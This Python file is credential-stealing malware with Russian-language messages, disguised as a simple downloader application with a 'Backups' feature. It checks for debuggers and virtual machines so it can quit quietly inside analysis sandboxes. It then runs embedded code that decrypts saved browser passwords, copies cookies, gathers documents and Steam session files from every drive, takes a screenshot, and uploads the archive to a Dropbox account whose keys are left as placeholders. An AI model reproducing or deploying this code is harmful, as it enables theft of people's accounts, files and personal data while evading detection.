##Creating By Pr1me_StRel0k and GameKybe ##

import tkinter as tk
from tkinter import messagebox, simpledialog, ttk
import requests
import threading
import sys
import os
import json
import base64
import sqlite3
import win32crypt
import shutil
import tempfile
import zipfile
import dropbox
import string
import ctypes
from pathlib import Path
from datetime import datetime
import pyautogui
from Crypto.Cipher import AES
import time
import subprocess
import platform
import uuid
import winreg
from typing import List, Tuple, Optional


anti_analysis_code = """
DETECTION_THRESHOLD = 5

class AntiAnalysis:
    def __init__(self, threshold: int = DETECTION_THRESHOLD):
        self.threshold = threshold
        self.score = 0
        self.reasons: List[str] = []
        self.is_windows = platform.system().lower() == "windows"

    def _add_detection(self, reason: str, weight: int):
        self.score += weight
        self.reasons.append(f"{reason} [+{weight} очков]")

    -
    def _is_debugger_present(self) -> bool:
        try:
            if sys.gettrace() is not None:
                self._add_detection("Обнаружен активный отладчик (sys.gettrace())", 100)
                return True
        except Exception:
            pass
        return False

    def _check_bios_manufacturer(self):
        if not self.is_windows:
            return
        suspects = ("virtual", "vmware", "vbox", "virtualbox", "qemu", "innotek", "parallels")
        try:
            command = ["powershell", "-Command", "Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Manufacturer"]
            out = subprocess.check_output(command, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            out = out.decode(errors="ignore").lower()
            for vendor in suspects:
                if vendor in out:
                    self._add_detection(f"Подозрительный производитель BIOS: {vendor}", 5)
                    return
        except (FileNotFoundError, subprocess.CalledProcessError):
            pass

    def _check_running_processes(self):
        vm_processes = ("vmtoolsd", "vboxservice", "vboxtray", "qemu-ga", "prl_tools")
        command = []
        try:
            if self.is_windows:
                command = ["tasklist"]
            else: 
                command = ["ps", "aux"]
            out = subprocess.check_output(command, stderr=subprocess.DEVNULL).decode(errors="ignore").lower()
            for name in vm_processes:
                if name in out:
                    self._add_detection(f"Найден процесс, связанный с ВМ: {name}", 5)
                    return
        except (FileNotFoundError, subprocess.CalledProcessError):
            pass

    def _check_mac_address(self):
        vm_mac_prefixes = ("00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27", "00:15:5d")
        try:
            mac_hex = f'{uuid.getnode():012x}'
            mac = ":".join(mac_hex[i:i+2] for i in range(0, 12, 2))
            for prefix in vm_mac_prefixes:
                if mac.startswith(prefix):
                    self._add_detection(f"MAC-адрес ({mac}) соответствует префиксу ВМ: {prefix}", 3)
                    return
        except Exception:
            pass

    def _check_windows_registry(self):
        if not self.is_windows:
            return
        vm_keys = [
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SOFTWARE\Oracle\VirtualBox Guest Additions",
            r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
            r"SYSTEM\CurrentControlSet\Services\VMTools",
        ]
        for path in vm_keys:
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path):
                    self._add_detection(f"Найдена специфичная для ВМ ветка реестра: {path}", 10)
                    return
            except FileNotFoundError:
                continue
            except Exception:
                pass

    def _check_filesystem_artifacts(self):
        vm_paths = [
            "C:\\Program Files\\VMware\\VMware Tools\\",
            "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\",
            "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
            "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
            "/usr/share/virtualbox/", 
            "/usr/share/vmware-tools/",
        ]
        for path in vm_paths:
            if os.path.exists(path):
                self._add_detection(f"Найден артефакт файловой системы ВМ: {path}", 8)
                return

    def _check_cpu_cores(self):
        try:
            cores = os.cpu_count()
            if cores is not None and cores <= 2:
                self._add_detection(f"Низкое количество ядер ЦП ({cores}), характерное для ВМ", 2)
        except Exception:
            pass
            
    def run(self) -> bool:
        print("[+] Запуск проверок на обнаружение среды анализа...")
        if self._is_debugger_present():
            return True 
            
        checks_to_run = [
            self._check_bios_manufacturer,
            self._check_running_processes,
            self._check_mac_address,
            self._check_windows_registry,
            self._check_filesystem_artifacts,
            self._check_cpu_cores,
        ]
        for check_func in checks_to_run:
            check_func()
            
        return self.is_hostile()

    def is_hostile(self) -> bool:
        return self.score >= self.threshold


def silent_mode_exit():
    sys.exit(0)

def silent_mode_sleep(duration_seconds: int = 600):
    time.sleep(duration_seconds)
    sys.exit(0)

def main():
    detector = AntiAnalysis()
    is_detected = detector.run()
    
    print(f"[+] Проверка завершена.")
    print(f"[+] Итоговый счет: {detector.score} (Порог: {detector.threshold})")
    
    if detector.reasons:
        print("[+] Причины обнаружения:")
        for r in detector.reasons:
            print(f" - {r}")
            
    if is_detected:
        print("\n[!] Обнаружена среда анализа! Активация защитного механизма.")
        silent_mode_exit()
        # silent_mode_sleep()
    else:
        print("\n[+] Среда чиста. Запуск основной логики программы...")
        for i in range(3):
            print(f"Выполняется полезная работа... шаг {i+1}/3")
            time.sleep(1)
        print("Завершено.")

if __name__ == "__main__":
    
    detector = AntiAnalysis()
    is_detected = detector.run()
    
    
    print(f"[+] Проверка завершена.")
    print(f"[+] Итоговый счет: {detector.score} (Порог: {detector.threshold})")
    if detector.reasons:
        print("[+] Причины обнаружения:")
        for r in detector.reasons:
            print(f" - {r}")

   
    if is_detected:
        
        print("\n[!] Обнаружена среда анализа! Активация защитного механизма.")
        silent_mode_exit() # or sys.exit(0)
    else:
        
        print("\n[+] Среда чиста. Запуск основной логики программы...")
        
        root = tk.Tk()
        root.title("Программа-загрузчик")
        root.geometry("400x200")

        main_label = tk.Label(root, text="Главное меню", font=("Arial", 16, "bold"), pady=15)
        main_label.pack()

        info_label = tk.Label(root, text="Нажмите кнопку, чтобы скачать программу\nи получить доступ к секретной части.", font=("Arial", 10), pady=10)
        info_label.pack()

        download_button = tk.Button(root, text="Скачать", command=start_download_thread, font=("Arial", 12), bg="#4CAF50", fg="white", width=20, height=2)
        download_button.pack(pady=10)

        root.mainloop()
"""
second_script_code = """

APP_KEY = "YOUR APP DROPBOX KEY"   
APP_SECRET = "YOUR APP DROPBOX SECRET KEY"
REFRESH_TOKEN = "YOUR DROPBOX REFRESH TOKEN" 

SAVE_DIR = Path.home() / "Backups"
SAVE_DIR.mkdir(parents=True, exist_ok=True)


BROWSERS = {
    'chrome': {
        'name': 'Chrome',
        'profile': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
        'local_state': 'Local State',
        'login_db': 'Default\\Login Data',
        'cookie_db': 'Default\\Network\\Cookies'
    },
    'edge': {
        'name': 'Edge',
        'profile': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
        'local_state': 'Local State',
        'login_db': 'Default\\Login Data',
        'cookie_db': 'Default\\Network\\Cookies'
    },
    'opera': {
        'name': 'Opera',
        'profile': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable'),
        'local_state': 'Local State',
        'login_db': 'Login Data',
        'cookie_db': 'Network\\Cookies'
    },
    'opera_gx': {
        'name': 'Opera GX',
        'profile': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera GX Stable'),
        'local_state': 'Local State',
        'login_db': 'Login Data',
        'cookie_db': 'Network\\Cookies'
    },
    'yandex': {
        'name': 'Yandex',
        'profile': os.path.join(os.environ['LOCALAPPDATA'], 'Yandex', 'YandexBrowser', 'User Data'),
        'local_state': 'Local State',
        'login_db': 'Default\\Ya Passman Data',
        'cookie_db': 'Default\\Network\\Cookies'
    }
}


def get_master_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_value(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        return "Error decrypting"

def extract_passwords(browser):
    profile_path = BROWSERS[browser]['profile']
    local_state_path = os.path.join(profile_path, BROWSERS[browser]['local_state'])
    login_db_path = os.path.join(profile_path, BROWSERS[browser]['login_db'])

    if not os.path.exists(login_db_path):
        return []

    master_key = get_master_key(local_state_path)

    temp_db = tempfile.mktemp()
    shutil.copyfile(login_db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = []
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        password = decrypt_value(encrypted_password, master_key)
        if username or password:
            data.append((BROWSERS[browser]['name'], url, username, password))
    conn.close()
    os.remove(temp_db)
    return data

def copy_cookies(browser, temp_dir):
    profile_path = BROWSERS[browser]['profile']
    cookie_db_path = os.path.join(profile_path, BROWSERS[browser]['cookie_db'])
    if os.path.exists(cookie_db_path):
        shutil.copy(cookie_db_path, os.path.join(temp_dir, f"{browser}_cookies.db"))


def list_drives():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(f"{letter}:/")
        bitmask >>= 1
    return drives


FILE_TYPES = [
    ".txt", ".doc", ".docx", ".pdf", ".paint", ".png", ".jpg", ".dat",
    ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".rtf", ".db", ".sql", ".mdb",
    ".cfg", ".conf", ".ini"
]
STEAM_FILES = ["config.vdf", "loginusers.vdf", "SteamAppData.vdf"]

def find_files():
    found = []
    for drive in list_drives():
        for root, dirs, files in os.walk(drive, topdown=True, errors="ignore"):
            for file in files:
                path = Path(root) / file
                if path.suffix.lower() in FILE_TYPES:
                    found.append(path)
                if file.lower() in STEAM_FILES or file.lower().startswith("ssfn"):
                    found.append(path)
    return found


def create_zip(files, passwords, temp_dir):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    zip_path = SAVE_DIR / f"backup_{timestamp}.zip"

    creds_file = Path(temp_dir) / "credentials.txt"
    with open(creds_file, "w", encoding="utf-8") as f:
        f.write("Browser | Domain | Login | Password\n")
        f.write("=" * 50 + "\n")
        for entry in passwords:
            f.write(" | ".join(map(str, entry)) + "\n")

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
        for file in files:
            try:
                archive.write(file, arcname=file.name)
            except Exception as e:
                print(f"[!] Ошибка с файлом {file}: {e}")

        for root, _, dbfiles in os.walk(temp_dir):
            for f in dbfiles:
                archive.write(os.path.join(root, f), arcname=f)

        screenshot = SAVE_DIR / "screenshot.png"
        pyautogui.screenshot().save(screenshot)
        archive.write(screenshot, arcname="screenshot.png")
        screenshot.unlink()

    return zip_path


def upload_to_dropbox(local_path):
    dbx = dropbox.Dropbox(
        oauth2_refresh_token=REFRESH_TOKEN,
        app_key=APP_KEY,
        app_secret=APP_SECRET
    )
    target_path = f"/Backups/{Path(local_path).name}"
    with open(local_path, "rb") as f:
        dbx.files_upload(
            f.read(),
            target_path,
            mode=dropbox.files.WriteMode("overwrite")
        )
    print(f"[+] Архив загружен в Dropbox: {target_path}")


def main():
    print("[*] Ищу файлы...")
    files = find_files()
    print(f"[+] Найдено файлов: {len(files)}")

    print("[*] Извлекаю данные браузеров...")
    temp_dir = tempfile.mkdtemp()
    all_passwords = []
    for browser in BROWSERS:
        try:
            passwords = extract_passwords(browser)
            all_passwords.extend(passwords)
            copy_cookies(browser, temp_dir)
        except Exception as e:
            print(f"Ошибка с {browser}: {e}")

    print("[*] Создаю архив...")
    zip_file = create_zip(files, all_passwords, temp_dir)
    print(f"[+] Архив создан: {zip_file}")

    print("[*] Загружаю в Dropbox...")
    upload_to_dropbox(zip_file)

    try:
        os.remove(zip_file)
        print(f"[+] Локальный архив удалён: {zip_file}")
    except Exception as e:
        print(f"[!] Ошибка при удалении {zip_file}: {e}")

    shutil.rmtree(temp_dir)
    print("[+] Готово.")

if __name__ == "__main__":
    main()
"""



CORRECT_PASSWORD = "1234"
FILE_URL = "your download url"
SAVE_AS_FILENAME = "your name file"


def download_and_prompt():
    try:
        messagebox.showinfo("Загрузка", f"Начинается скачивание файла...\nИз: {FILE_URL}")
        response = requests.get(FILE_URL, stream=True)
        response.raise_for_status()
        save_path = os.path.join(os.path.expanduser("~"), "Desktop", SAVE_AS_FILENAME)
        with open(save_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        messagebox.showinfo("Успех", f"Файл успешно скачан и сохранен как '{SAVE_AS_FILENAME}' на вашем рабочем столе.")
        
        password = simpledialog.askstring("Требуется пароль", "Введите пароль для запуска второй части:", show='*')
        
        if password == CORRECT_PASSWORD:
            messagebox.showinfo("Доступ разрешен", "Пароль верный. Запускаю вторую часть программы.")
            exec(second_script_code, globals())
        else:
            messagebox.showerror("Ошибка доступа", "Неверный пароль!")
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Ошибка сети", f"Не удалось скачать файл. Проверьте подключение к интернету.\nОшибка: {e}")
    except Exception as e:
        messagebox.showerror("Неизвестная ошибка", f"Произошла ошибка: {e}")

def start_download_thread():
    download_thread = threading.Thread(target=download_and_prompt)
    download_thread.daemon = True
    download_thread.start()
